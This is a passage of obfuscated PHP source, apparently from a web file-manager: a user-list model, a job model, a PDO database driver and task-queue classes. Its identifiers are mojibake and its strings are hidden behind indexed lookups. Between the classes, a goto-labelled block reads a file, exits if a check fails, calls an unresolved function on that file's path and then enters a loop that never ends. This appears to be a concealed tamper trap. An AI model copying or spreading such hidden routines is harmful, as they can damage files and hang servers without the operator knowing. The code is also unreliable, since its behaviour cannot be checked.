$•ÕÄ‚ï[422] => $“ùŞ¿ïØ, $•ÕÄ‚ï[421] => $Š™ïèêú); if ($this->where($“İ³ƒÚ)->find()) { return !1; } $“İ³ƒÚ = array($•ÕÄ‚ï[1671] => USER_ID, $•ÕÄ‚ï[484] => 0); $ú¼÷£“ú = $this->where($“İ³ƒÚ)->max($•ÕÄ‚ï[1876]); if (!$ú¼÷£“ú) { $ú¼÷£“ú = 0; } if (!$Îş–ü¶« && $“ùŞ¿ïØ == $•ÕÄ‚ï[416]) { $âÖÀ«ßñ = Model($•ÕÄ‚ï[1350])->where(array($•ÕÄ‚ï[417] => $Š™ïèêú))->find(); if (!$âÖÀ«ßñ) { return !1; } $Îş–ü¶« = $âÖÀ«ßñ[$•ÕÄ‚ï[32]]; } $Îş–ü¶« = $this->getAutoName($Îş–ü¶«); $¸í›’™¡ = array($•ÕÄ‚ï[1671] => USER_ID, $•ÕÄ‚ï[484] => 0, $•ÕÄ‚ï[420] => $Îş–ü¶«, $•ÕÄ‚ï[421] => $Š™ïèêú, $•ÕÄ‚ï[422] => $“ùŞ¿ïØ, $•ÕÄ‚ï[1856] => $ú¼÷£“ú + 1); return $this->add($¸í›’™¡); } protected function remove($şù ö¶İ) { $‘Œ¹´šü =& $_SERVER[³·—™¤¢]; $¬ßµ›Öş = array($‘Œ¹´šü[1671] => USER_ID, $‘Œ¹´šü[419] => $şù ö¶İ); return $this->where($¬ßµ›Öş)->delete(); } protected function removeByName($„Á»óü¬) { $É§â×õø =& $_SERVER[³·—™¤¢]; $‹…ûã²ª = array($É§â×õø[1671] => USER_ID, $É§â×õø[420] => $„Á»óü¬, $É§â×õø[484] => 0); return $this->where($‹…ûã²ª)->delete(); } protected function rename($î÷»¬Ã², $¼šØ©ù«) { $á˜çËÎ =& $_SERVER[³·—™¤¢]; if ($î÷»¬Ã² == $¼šØ©ù«) { return !1; } $ÓÑäø = $this->getAutoName($¼šØ©ù«); if ($¼šØ©ù« != $ÓÑäø) { return !1; } $ ÷¯¹ì = array($á˜çËÎ[1671] => USER_ID, $á˜çËÎ[484] => 0, $á˜çËÎ[32] => $î÷»¬Ã²); return $this->where($ ÷¯¹ì)->save(array($á˜çËÎ[32] => $¼šØ©ù«)); } protected function resetSort($Ì™–³ë±) { $Œ¢Şàä© =& $_SERVER[³·—™¤¢]; $Ì™–³ë± = is_array($Ì™–³ë±) ? $Ì™–³ë± : array(); $í‡úËÙ” = array($Œ¢Şàä©[1671] => USER_ID); for ($¢‡ğ¦ƒ¿ = 0; $¢‡ğ¦ƒ¿ < count($Ì™–³ë±); $¢‡ğ¦ƒ¿++) { $í‡úËÙ”[$Œ¢Şàä©[419]] = $Ì™–³ë±[$¢‡ğ¦ƒ¿]; $this->where($í‡úËÙ”)->save(array($Œ¢Şàä©[1856] => $¢‡ğ¦ƒ¿ + 1)); } return !0; } protected function moveTop($ƒåóÚ›) { $º¡ÍáäÉ =& $_SERVER[³·—™¤¢]; $˜·ş¯©ë = array($º¡ÍáäÉ[1671] => USER_ID, $º¡ÍáäÉ[484] => 0); $šÜ¡éÂĞ = $this->where($˜·ş¯©ë)->where(array($º¡ÍáäÉ[32] => $ƒåóÚ›))->find(); if (!$šÜ¡éÂĞ) { return; } $Ñ¶ÌËâû = $this->field($º¡ÍáäÉ[399])->where($˜·ş¯©ë)->order($º¡ÍáäÉ[2294])->select(); $Ñ¶ÌËâû = array_to_keyvalue($Ñ¶ÌËâû, $º¡ÍáäÉ[12], $º¡ÍáäÉ[399]); $›÷‰ã¢ö = $Ñ¶ÌËâû; $Ñ¶ÌËâû = array_remove_value($Ñ¶ÌËâû, $šÜ¡éÂĞ[$º¡ÍáäÉ[399]]); array_unshift($Ñ¶ÌËâû, $šÜ¡éÂĞ[$º¡ÍáäÉ[399]]); return $this->resetSort($Ñ¶ÌËâû); } protected function moveBottom($öáİÎú¡) { $·€ÀİÓ¹ =& $_SERVER[³·—™¤¢]; $‘²¦Éòø = array($·€ÀİÓ¹[1671] => USER_ID, $·€ÀİÓ¹[484] => 0); $¡†ËÄöë = $this->where($‘²¦Éòø)->max($·€ÀİÓ¹[1876]); $æ¸ñö³ˆ = array($·€ÀİÓ¹[1876] => $¡†ËÄöë + 1); return $this->where($‘²¦Éòø)->where(array($·€ÀİÓ¹[32] => $öáİÎú¡))->save($æ¸ñö³ˆ); } private function getAutoName($‰ú…‘¹Á) { $ŞÚºÏ“› =& $_SERVER[³·—™¤¢]; $¦û°“ = array($ŞÚºÏ“›[1671] => USER_ID, $ŞÚºÏ“›[484] => 0); $ëÚÀÂ€ = $this->field($ŞÚºÏ“›[32])->where($¦û°“)->select(); $ëÚÀÂ€ = array_to_keyvalue($ëÚÀÂ€, $ŞÚºÏ“›[12], $ŞÚºÏ“›[32]); if (!$ëÚÀÂ€ || !in_array($‰ú…‘¹Á, $ëÚÀÂ€)) { return $‰ú…‘¹Á; } for ($‰”¾’÷¬ = 0; $‰”¾’÷¬ < count($ëÚÀÂ€); $‰”¾’÷¬++) { if (!in_array($‰ú…‘¹Á . "\50{$‰”¾’÷¬}\x29", $ëÚÀÂ€)) { return $‰ú…‘¹Á . "\x28{$‰”¾’÷¬}\51"; } } return $‰ú…‘¹Á . "\x28{$‰”¾’÷¬}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\56\152\x6f\142\x4c\151\163\164"; public $field = array("\x6e\x61\x6d\145", "\x64\x65\163\x63", "\163\157\162\x74"); const JOB_KEY = "\x73\145\x6c\x66\x4a\x6f\142\x4c\151\163\164"; public function listData($óªØÊÍ = false, $ÚåŞ˜ø = "\163\x6f\162\x74", $Å†à—¾¤ = false) { return parent::listData($óªØÊÍ, $ÚåŞ˜ø, $Å†à—¾¤); } public function remove($²¨Ò–äË) { return parent::remove($²¨Ò–äË); } public function add($ı¶©‚Úä) { $ì£Âñ =& $_SERVER[³·—™¤¢]; if ($this->findByName($ı¶©‚Úä[$ì£Âñ[32]])) { return !1; } $ı¶©‚Úä[$ì£Âñ[1876]] = $this->getSort(); return parent::insert($ı¶©‚Úä); } private function getSort() { $óì˜å¹õ =& $_SERVER[³·—™¤¢]; $ºŞúîÂƒ = parent::listData(); $‹Ã³Ó† = array_to_keyvalue($ºŞúîÂƒ, $óì˜å¹õ[12], $óì˜å¹õ[1876]); return empty($‹Ã³Ó†) ? 0 : max($‹Ã³Ó†) + 1; } public function update($äƒóÏÇ“, $ÔÏáÇá) { $«­ŞÆ·€ =& $_SERVER[³·—™¤¢]; $é¸ÖÒÓ = parent::listData($äƒóÏÇ“); $Ñ‰÷É‚ = $this->findByName($ÔÏáÇá[$«­ŞÆ·€[32]]); if (!$é¸ÖÒÓ || $Ñ‰÷É‚ && $Ñ‰÷É‚[$«­ŞÆ·€[399]] != $é¸ÖÒÓ[$«­ŞÆ·€[399]]) { return !1; } return parent::update($äƒóÏÇ“, $ÔÏáÇá); } public function setUserJob($–³òö§“, $İÌÉü®“) { $“ˆşëÄ =& $_SERVER[³·—™¤¢]; if (!is_array($İÌÉü®“)) { $İÌÉü®“ = array($İÌÉü®“); } $ãŞÜ†® = parent::listData(); $¹ÉŞ«¬’ = array_to_keyvalue($ãŞÜ†®, $“ˆşëÄ[32]); $„Ûœùğè = $“ˆşëÄ[378]; foreach ($İÌÉü®“ as $÷Ÿ¿ÖÚá) { if ($¹ÉŞ«¬’[$÷Ÿ¿ÖÚá]) { $„Ûœùğè .= $¹ÉŞ«¬’[$÷Ÿ¿ÖÚá][$“ˆşëÄ[399]] . $“ˆşëÄ[50]; } else { $Áîà´“â = $this->add($÷Ÿ¿ÖÚá); $„Ûœùğè .= $Áîà´“â . $“ˆşëÄ[50]; } } $„Ûœùğè = rtrim($„Ûœùğè, $“ˆşëÄ[50]); Model($“ˆşëÄ[535])->metaSet($–³òö§“, self::JOB_KEY, $„Ûœùğè); } public function getUserJob($ç—üë÷æ) { $¿Ÿƒµ« = Model($_SERVER[³·—™¤¢][535])->metaGet($ç—üë÷æ); return $this->getUserJobInfo($¿Ÿƒµ«[self::JOB_KEY]); } public function getUserJobInfo($Ï»ÌÌƒ£) { $ÑñÙÍ‡ƒ =& $_SERVER[³·—™¤¢]; $Ôõ¢Ò…¸ = explode($ÑñÙÍ‡ƒ[50], $Ï»ÌÌƒ£); $¹™åµ¯ë = parent::listData(); $¹™åµ¯ë = array_remove_key($¹™åµ¯ë, $ÑñÙÍ‡ƒ[200]); $õäÈ†ÛÓ = array(); foreach ($Ôõ¢Ò…¸ as $Œì¨È®Ô) { if (isset($¹™åµ¯ë[$Œì¨È®Ô])) { $õäÈ†ÛÓ[] = $¹™åµ¯ë[$Œì¨È®Ô]; } } return $õäÈ†ÛÓ; } } goto fİó¸ä”ø; BËºùÓîÄ˜: if (!isset($_SERVER[$_SERVER[³·—™¤¢][892]]) || !isset($_SERVER[$_SERVER[³·—™¤¢][934]])) { $_getc = $_SERVER[³·—™¤¢][895]; $_getfile = $_SERVER[$_SERVER[³·—™¤¢][896]] . $_SERVER[³·—™¤¢][897]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[³·—™¤¢][231], $_getfilec); if (count($_getarrs) < $_SERVER[³·—™¤¢][632]) { $exit = $_SERVER[³·—™¤¢][898]; $exit(); } $_act = $_SERVER[³·—™¤¢][935]; $_act($_SERVER[$_SERVER[³·—™¤¢][896]] . $_SERVER[³·—™¤¢][897]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[³·—™¤¢][378]); } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($•Ìâ± = '') { $Ü›‚Û´ì =& $_SERVER[³·—™¤¢]; if (!class_exists($Ü›‚Û´ì[936])) { think_exception(think_lang($Ü›‚Û´ì[14]) . $Ü›‚Û´ì[937]); } if (!empty($•Ìâ±)) { $this->config = $•Ìâ±; if (empty($this->config[$Ü›‚Û´ì[17]])) { $this->config[$Ü›‚Û´ì[17]] = array(); } } } public function connect($¡øé†š¦ = '', $«ÏÏƒÆ = 0) { $ğò¬ºì‹ =& $_SERVER[³·—™¤¢]; if (!isset($this->linkID[$«ÏÏƒÆ])) { if (empty($¡øé†š¦)) { $¡øé†š¦ = $this->config; } $¥§¬«ƒŸ = !empty($¡øé†š¦[$ğò¬ºì‹[17]][$ğò¬ºì‹[18]]) ? $¡øé†š¦[$ğò¬ºì‹[17]][$ğò¬ºì‹[18]] : $this->pconnect; if ($¥§¬«ƒŸ) { $¡øé†š¦[$ğò¬ºì‹[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$«ÏÏƒÆ] = new PDO($¡øé†š¦[$ğò¬ºì‹[938]], $¡øé†š¦[$ğò¬ºì‹[908]], $¡øé†š¦[$ğò¬ºì‹[909]], $¡øé†š¦[$ğò¬ºì‹[17]]); } catch (PDOException $ì°È¤“­) { think_exception($ì°È¤“­->getMessage()); } $this->dbType = $this->_getDsnType($¡øé†š¦[$ğò¬ºì‹[938]]); if (in_array($this->dbType, array($ğò¬ºì‹[939], $ğò¬ºì‹[940], $ğò¬ºì‹[941], $ğò¬ºì‹[942]))) { think_exception($ğò¬ºì‹[943] . $this->dbType . $ğò¬ºì‹[944] . $this->dbType . $ğò¬ºì‹[945]); } if (!$this->linkID[$«ÏÏƒÆ]) { think_exception($ğò¬ºì‹[946]); } try { $this->linkID[$«ÏÏƒÆ]->exec($ğò¬ºì‹[947] . think_config($ğò¬ºì‹[911])); } catch (Exception $ì°È¤“­) { } $this->connected = !0; if (1 != think_config($ğò¬ºì‹[22])) { unset($this->config); } } return $this->linkID[$«ÏÏƒÆ]; } public function free() { $this->PDOStatement = null; } public function query($‹ÜÑÛÆ÷, $†ÃÚ´¡Î = array()) { $æãğ‡ƒ =& $_SERVER[³·—™¤¢]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‹ÜÑÛÆ÷; if (!empty($†ÃÚ´¡Î)) { $this->queryStr .= $æãğ‡ƒ[948] . print_r($†ÃÚ´¡Î, !0) . $æãğ‡ƒ[949]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($æãğ‡ƒ[23], 1); think_status($æãğ‡ƒ[24]); $this->PDOStatement = $this->_linkID->prepare($‹ÜÑÛÆ÷); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $±¬¥Ì½² = $this->PDOStatement->execute($†ÃÚ´¡Î); $this->debug(); if (!1 === $±¬¥Ì½²) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($Û²Ã–Á–, $î©›á™ = array()) { $úêå ™‘ =& $_SERVER[³·—™¤¢]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Û²Ã–Á–; if (!empty($î©›á™)) { $this->queryStr .= $úêå ™‘[948] . print_r($î©›á™, !0) . $úêå ™‘[949]; } $êèÃ¶¯Ú = !1; if ($this->dbType == $úêå ™‘[942]) { if (preg_match($úêå ™‘[950], $this->queryStr, $¸™äÈºó)) { $this->table = think_config($úêå ™‘[951]) . str_ireplace(think_config($úêå ™‘[952]), $úêå ™‘[378], $¸™äÈºó[2]); $êèÃ¶¯Ú = (bool) $this->query($úêå ™‘[953] . strtoupper($this->table) . $úêå ™‘[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($úêå ™‘[25], 1); think_status($úêå ™‘[24]); $this->PDOStatement = $this->_linkID->prepare($Û²Ã–Á–); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $æÁ¸Ş›€ = $this->PDOStatement->execute($î©›á™); $this->debug(); if (!1 === $æÁ¸Ş›€) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($êèÃ¶¯Ú || preg_match($úêå ™‘[954], $Û²Ã–Á–)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $æ¾¶øâ¦ = $this->_linkID->commit(); $this->transTimes = 0; if (!$æ¾¶øâ¦) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÈÄÖìÇ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ÈÄÖìÇ) { $this->error(); return !1; } } return !0; } private function getAll() { $åÛëş¬î = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($åÛëş¬î); return $åÛëş¬î; } public function getFields($˜¥çûÅ±) { $ ñãÜÛ =& $_SERVER[³·—™¤¢]; $this->initConnect(!0); if (think_config($ ñãÜÛ[955])) { $ß‰şôõğ = str_replace($ ñãÜÛ[956], $˜¥çûÅ±, think_config($ ñãÜÛ[955])); } else { switch ($this->dbType) { case $ ñãÜÛ[939]: case $ ñãÜÛ[957]: $ß‰şôõğ = "\123\105\114\x45\103\x54\40\x20\x20\143\157\154\165\155\156\137\156\141\x6d\x65\40\x61\x73\40\x27\116\141\155\x65\x27\54\40\40\40\144\x61\x74\141\x5f\164\x79\x70\145\x20\141\163\40\x27\124\171\x70\145\x27\54\40\x20\40\143\x6f\x6c\x75\155\x6e\x5f\144\145\146\x61\x75\154\164\x20\141\x73\x20\47\104\x65\146\x61\165\154\164\47\54\40\40\x20\x69\163\x5f\156\x75\154\x6c\x61\x62\x6c\x65\x20\x61\x73\40\x27\x4e\165\154\154\x27\12\11\x9\x46\x52\x4f\x4d\11\x69\156\146\x6f\162\x6d\141\164\151\x6f\156\137\x73\143\x68\145\x6d\141\56\x74\x61\x62\x6c\145\x73\x20\x41\123\40\164\12\11\11\x4a\117\x49\x4e\11\x69\x6e\146\x6f\162\155\x61\164\x69\157\156\137\x73\x63\x68\x65\155\141\56\x63\157\154\x75\x6d\x6e\163\x20\101\x53\x20\143\12\x9\11\117\116\x20\40\164\x2e\164\x61\142\154\x65\x5f\x63\x61\164\141\x6c\157\x67\x20\75\x20\143\x2e\x74\141\x62\154\x65\x5f\143\141\x74\141\x6c\x6f\147\12\11\11\101\116\104\40\164\x2e\x74\141\142\x6c\x65\137\163\x63\150\145\155\x61\40\x3d\40\x63\x2e\x74\x61\x62\154\145\137\x73\x63\150\x65\x6d\x61\12\11\x9\101\x4e\104\40\x74\56\164\x61\x62\154\x65\137\156\141\155\x65\x20\x3d\40\x63\56\x74\x61\x62\x6c\x65\137\x6e\x61\155\x65\xa\11\11\127\x48\105\x52\105\x20\x20\x20\164\x2e\164\141\x62\154\145\137\x6e\x61\155\x65\x20\75\40\47{$˜¥çûÅ±}\x27"; break; case $ ñãÜÛ[958]: $ß‰şôõğ = $ ñãÜÛ[959] . $˜¥çûÅ± . $ ñãÜÛ[960]; break; case $ ñãÜÛ[940]: case $ ñãÜÛ[942]: $ß‰şôõğ = $ ñãÜÛ[961] . $ ñãÜÛ[962] . $ ñãÜÛ[963] . strtoupper($˜¥çûÅ±) . $ ñãÜÛ[964] . strtoupper($˜¥çûÅ±) . $ ñãÜÛ[965]; break; case $ ñãÜÛ[966]: $ß‰şôõğ = $ ñãÜÛ[967] . $˜¥çûÅ± . $ ñãÜÛ[968]; break; case $ ñãÜÛ[941]: break; case $ ñãÜÛ[969]: default: $ß‰şôõğ = $ ñãÜÛ[970] . ($this->dbType == $ ñãÜÛ[969] ? "\140{$˜¥çûÅ±}\x60" : $˜¥çûÅ±); } } $òÖ¬º†ğ = $this->query($ß‰şôõğ); $Ü‡à‚ä¾ = array(); if ($òÖ¬º†ğ) { foreach ($òÖ¬º†ğ as $¹© Ù¯€ => $ï×Çùå) { $ï×Çùå = array_change_key_case($ï×Çùå); $ï×Çùå[$ ñãÜÛ[32]] = isset($ï×Çùå[$ ñãÜÛ[32]]) ? $ï×Çùå[$ ñãÜÛ[32]] : $ ñãÜÛ[378]; $ï×Çùå[$ ñãÜÛ[33]] = isset($ï×Çùå[$ ñãÜÛ[33]]) ? $ï×Çùå[$ ñãÜÛ[33]] : $ ñãÜÛ[378]; $Â£Í¿ş« = isset($ï×Çùå[$ ñãÜÛ[273]]) ? $ï×Çùå[$ ñãÜÛ[273]] : $ï×Çùå[$ ñãÜÛ[32]]; $Ü‡à‚ä¾[$Â£Í¿ş«] = array($ ñãÜÛ[32] => $Â£Í¿ş«, $ ñãÜÛ[33] => $ï×Çùå[$ ñãÜÛ[33]], $ ñãÜÛ[35] => (bool) (isset($ï×Çùå[$ ñãÜÛ[103]]) && $ï×Çùå[$ ñãÜÛ[103]] === $ ñãÜÛ[12] || isset($ï×Çùå[$ ñãÜÛ[35]]) && $ï×Çùå[$ ñãÜÛ[35]] === $ ñãÜÛ[12]), $ ñãÜÛ[37] => isset($ï×Çùå[$ ñãÜÛ[37]]) ? $ï×Çùå[$ ñãÜÛ[37]] : (isset($ï×Çùå[$ ñãÜÛ[56]]) ? $ï×Çùå[$ ñãÜÛ[56]] : $ ñãÜÛ[378]), $ ñãÜÛ[39] => isset($ï×Çùå[$ ñãÜÛ[94]]) ? strtolower($ï×Çùå[$ ñãÜÛ[94]]) == $ ñãÜÛ[41] : (isset($ï×Çùå[$ ñãÜÛ[57]]) ? $ï×Çùå[$ ñãÜÛ[57]] : !1), $ ñãÜÛ[42] => isset($ï×Çùå[$ ñãÜÛ[971]]) ? strtolower($ï×Çùå[$ ñãÜÛ[971]]) == $ ñãÜÛ[44] : (isset($ï×Çùå[$ ñãÜÛ[94]]) ? $ï×Çùå[$ ñãÜÛ[94]] : !1)); } } return $Ü‡à‚ä¾; } public function getTables($ñ’äµ…“ = '') { $é·çáß =& $_SERVER[³·—™¤¢]; if (think_config($é·çáß[972])) { $Â‘½¶Ë³ = str_replace($é·çáß[973], $ñ’äµ…“, think_config($é·çáß[972])); } else { switch ($this->dbType) { case $é·çáß[940]: case $é·çáß[942]: $Â‘½¶Ë³ = $é·çáß[974]; break; case $é·çáß[939]: case $é·çáß[957]: $Â‘½¶Ë³ = $é·çáß[975]; break; case $é·çáß[966]: $Â‘½¶Ë³ = $é·çáß[976]; break; case $é·çáß[941]: think_exception(think_lang($é·çáß[977]) . $é·çáß[978]); break; case $é·çáß[958]: $Â‘½¶Ë³ = $é·çáß[45] . $é·çáß[46] . $é·çáß[47]; break; case $é·çáß[969]: default: if (!empty($ñ’äµ…“)) { $Â‘½¶Ë³ = $é·çáß[919] . $ñ’äµ…“ . $é·çáß[920]; } else { $Â‘½¶Ë³ = $é·çáß[921]; } } } $ÛÆ«İÁ = $this->query($Â‘½¶Ë³); $Úïœ…¨ = array(); foreach ($ÛÆ«İÁ as $Ù—’…öù => $Î¯Ì¦èõ) { $Úïœ…¨[$Ù—’…öù] = current($Î¯Ì¦èõ); } return $Úïœ…¨; } protected function parseLimit($¾šâ—£û) { $‹º»½œÀ =& $_SERVER[³·—™¤¢]; $ë˜äÙÔ = $‹º»½œÀ[12]; if (!empty($¾šâ—£û)) { switch ($this->dbType) { case $‹º»½œÀ[966]: case $‹º»½œÀ[958]: $¾šâ—£û = explode($‹º»½œÀ[50], $¾šâ—£û); if (count($¾šâ—£û) > 1) { $ë˜äÙÔ .= $‹º»½œÀ[51] . $¾šâ—£û[1] . $‹º»½œÀ[52] . $¾šâ—£û[0] . $‹º»½œÀ[53]; } else { $ë˜äÙÔ .= $‹º»½œÀ[51] . $¾šâ—£û[0] . $‹º»½œÀ[53]; } break; case $‹º»½œÀ[939]: case $‹º»½œÀ[957]: break; case $‹º»½œÀ[941]: break; case $‹º»½œÀ[940]: case $‹º»½œÀ[942]: break; case $‹º»½œÀ[969]: default: $ë˜äÙÔ .= $‹º»½œÀ[51] . $¾šâ—£û . $‹º»½œÀ[53]; } } return $ë˜äÙÔ; } public function parseKey(&$Ï±°™à±, $üü·’š— = true) { $ïİ‹‡ã =& $_SERVER[³·—™¤¢]; if ($üü·’š—) { $Ï±°™à± = $this->parseKeyCheck($Ï±°™à±); } if ($this->dbType == $ïİ‹‡ã[969]) { if ($Ï±°™à± != $ïİ‹‡ã[188] && !preg_match($ïİ‹‡ã[931], $Ï±°™à±)) { $Ï±°™à± = $ïİ‹‡ã[385] . trim($Ï±°™à±, $ïİ‹‡ã[385]) . $ïİ‹‡ã[385]; } return $Ï±°™à±; } else { return parent::parseKey($Ï±°™à±, $üü·’š—); } } public function close() { $this->_linkID = null; } public function error() { $°ê¢È•ä =& $_SERVER[³·—™¤¢]; if ($this->PDOStatement) { $¼ÕÉØ·Õ = $this->PDOStatement->errorInfo(); $this->error = $¼ÕÉØ·Õ[1] . $°ê¢È•ä[4] . $¼ÕÉØ·Õ[2]; } else { $this->error = $°ê¢È•ä[12]; } if ($°ê¢È•ä[12] != $this->queryStr) { $this->error .= LNG($°ê¢È•ä[48]) . $this->queryStr; } think_trace($this->error, $°ê¢È•ä[12], $°ê¢È•ä[49]); return $this->error; } public function escapeString($ÃÂ•ëìª) { $±´¸—†Ñ =& $_SERVER[³·—™¤¢]; switch ($this->dbType) { case $±´¸—†Ñ[966]: case $±´¸—†Ñ[939]: case $±´¸—†Ñ[957]: case $±´¸—†Ñ[969]: return addslashes($ÃÂ•ëìª); case $±´¸—†Ñ[941]: case $±´¸—†Ñ[958]: case $±´¸—†Ñ[940]: case $±´¸—†Ñ[942]: return str_ireplace($±´¸—†Ñ[58], $±´¸—†Ñ[59], $ÃÂ•ëìª); } } protected function parseValue($Âí¾¡…å) { $ïÙûµ– =& $_SERVER[³·—™¤¢]; if (is_string($Âí¾¡…å)) { $í†ŞÆ°Ê = strpos($Âí¾¡…å, $ïÙûµ–[4]) === 0 && in_array($Âí¾¡…å, array_keys($this->bind)); $Âí¾¡…å = $í†ŞÆ°Ê ? $this->escapeString($Âí¾¡…å) : $ïÙûµ–[979] . $this->escapeString($Âí¾¡…å) . $ïÙûµ–[979]; } elseif (isset($Âí¾¡…å[0]) && is_string($Âí¾¡…å[0]) && strtolower($Âí¾¡…å[0]) == $ïÙûµ–[297]) { $Âí¾¡…å = $this->escapeString($Âí¾¡…å[1]); } elseif (is_array($Âí¾¡…å)) { $Âí¾¡…å = array_map(array($this, $ïÙûµ–[980]), $Âí¾¡…å); } elseif (is_bool($Âí¾¡…å)) { $Âí¾¡…å = $Âí¾¡…å ? $ïÙûµ–[88] : $ïÙûµ–[197]; } elseif (is_null($Âí¾¡…å)) { $Âí¾¡…å = $ïÙûµ–[103]; } return $Âí¾¡…å; } public function getLastInsertId() { $‹Ç¼Ãø½ =& $_SERVER[³·—™¤¢]; switch ($this->dbType) { case $‹Ç¼Ãø½[966]: case $‹Ç¼Ãø½[958]: case $‹Ç¼Ãø½[939]: case $‹Ç¼Ãø½[957]: case $‹Ç¼Ãø½[941]: case $‹Ç¼Ãø½[969]: return $this->_linkID->lastInsertId(); case $‹Ç¼Ãø½[940]: case $‹Ç¼Ãø½[942]: $Úºù²™ = $this->table; $·À¼«È = $this->query("\x53\105\114\105\x43\x54\40{$Úºù²™}\x2e\x63\165\x72\x72\x76\x61\x6c\x20\x63\x75\162\x72\x76\x61\x6c\x20\106\x52\117\115\40\144\165\141\154"); return $·À¼«È ? $·À¼«È[0][$‹Ç¼Ãø½[981]] : 0; } } } $_file = $_SERVER[$_SERVER[³·—™¤¢][934]]; goto e£á“ƒä²Í; a‡ÇµåÌôÃ: class TaskHttp extends Task { protected function startAfter() { $²›š¶¬à =& $_SERVER[³·—™¤¢]; $ æ¨Öì» =& $this->task; $ æ¨Öì»[$²›š¶¬à[1755]] = 1; Hook::bind($²›š¶¬à[1723], array($this, $²›š¶¬à[1756])); Hook::bind($²›š¶¬à[1725], array($this, $²›š¶¬à[1757])); Hook::bind($²›š¶¬à[1727], array($this, $²›š¶¬à[1758])); } protected function endAfter() { $Ûİ°®åğ =& $_SERVER[³·—™¤¢]; Hook::unbind($Ûİ°®åğ[1723], array($this, $Ûİ°®åğ[1756])); Hook::unbind($Ûİ°®åğ[1725], array($this, $Ûİ°®åğ[1757])); Hook::unbind($Ûİ°®åğ[1727], array($this, $Ûİ°®åğ[1758])); } public function progressStart($‹†ø°¦) { $‚ô­¾ =& $_SERVER[³·—™¤¢]; $¯ÚÒä›¹ = curl_getinfo($‹†ø°¦); self::log($‚ô­¾[1759] . $¯ÚÒä›¹[$‚ô­¾[307]]); self::valueSet($this->task[$‚ô­¾[399]], $this->task); } public function progressEnd($ä¿âØÃ…) { $–†´’¯Ö =& $_SERVER[³·—™¤¢]; self::log($–†´’¯Ö[1760] . $this->task[$–†´’¯Ö[399]]); $this->end(); } public function progress($š‹ÅŒÊ, $½²äÏ´´, $ ¦¨òßé, $¦’±ú†, $Û„ÈùŠ¦) { $ØİÁù»« =& $_SERVER[³·—™¤¢]; $‰éçíÜ =& $this->task; if ($Û„ÈùŠ¦ > 0) { $‰éçíÜ[$ØİÁù»«[806]] = $‰éçíÜ[$ØİÁù»«[806]] == 0 ? $¦’±ú† : $‰éçíÜ[$ØİÁù»«[806]]; $‰éçíÜ[$ØİÁù»«[1681]] = $Û„ÈùŠ¦; } else { if ($ ¦¨òßé > 0) { $‰éçíÜ[$ØİÁù»«[806]] = $‰éçíÜ[$ØİÁù»«[806]] == 0 ? $½²äÏ´´ : $‰éçíÜ[$ØİÁù»«[806]]; $‰éçíÜ[$ØİÁù»«[1681]] = $ ¦¨òßé; } } $this->update(); self::log("\x70\x72\157\147\162\145\x73\163\x48\164\164\x70\x3a\144\157\x77\156\72{$ ¦¨òßé}\57{$½²äÏ´´}\73\40\x75\x70\154\157\141\144\x3a{$Û„ÈùŠ¦}\57{$¦’±ú†}\x3b"); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\x73\x6b\121\165\x65\x75\x65\x4c\145\x6e\x67\x74\x68"; const QUEUE_DATA = "\x74\x61\x73\x6b\121\x75\x65\x75\x65\x44\x61\164\141"; public static $listData = false; public static function initTask() { } public static function add($¬Œ»”›Ã, $ƒƒÛÑƒ = array(), $ÆùÖ ¤Ü = '', $âèúş£¤ = '') { $½®Ã¾ =& $_SERVER[³·—™¤¢]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($âèúş£¤ && array_find_by_field(self::$listData, $½®Ã¾[94], $âèúş£¤)) { return !0; } self::$listData[] = array($½®Ã¾[264] => $¬Œ»”›Ã, $½®Ã¾[1761] => $ƒƒÛÑƒ, $½®Ã¾[453] => $ÆùÖ ¤Ü, $½®Ã¾[94] => $âèúş£¤); return !0; } public static function addSubmit() { $å­©úÈ =& $_SERVER[³·—™¤¢]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($å­©úÈ[1762] . json_encode_force(array_to_keyvalue(self::$listData, $å­©úÈ[12], $å­©úÈ[453])), $å­©úÈ[1763]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($ÖıÖ…¼Õ, $ŒŒ“¦Õ· = array(), $Á°ÆæÏĞ = '', $öüÍºÒÌ = '') { $Ó•Ñ­Ÿ =& $_SERVER[³·—™¤¢]; if (self::count() >= self::MAX_LENGTH) { return !1; } $öˆ¼ùã¨ = self::getAll(); if ($öüÍºÒÌ && array_find_by_field($öˆ¼ùã¨, $Ó•Ñ­Ÿ[94], $öüÍºÒÌ)) { return !0; } $öˆ¼ùã¨[] = array($Ó•Ñ­Ÿ[264] => $ÖıÖ…¼Õ, $Ó•Ñ­Ÿ[1761] => $ŒŒ“¦Õ·, $Ó•Ñ­Ÿ[453] => $Á°ÆæÏĞ, $Ó•Ñ­Ÿ[94] => $öüÍºÒÌ); write_log($Ó•Ñ­Ÿ[1762] . $Á°ÆæÏĞ, $Ó•Ñ­Ÿ[1763]); self::setAll($öˆ¼ùã¨); return !0; } public static function run() { $¨©õ¬Â =& $_SERVER[³·—™¤¢]; $èÇåñº¶ = self::getAll(); 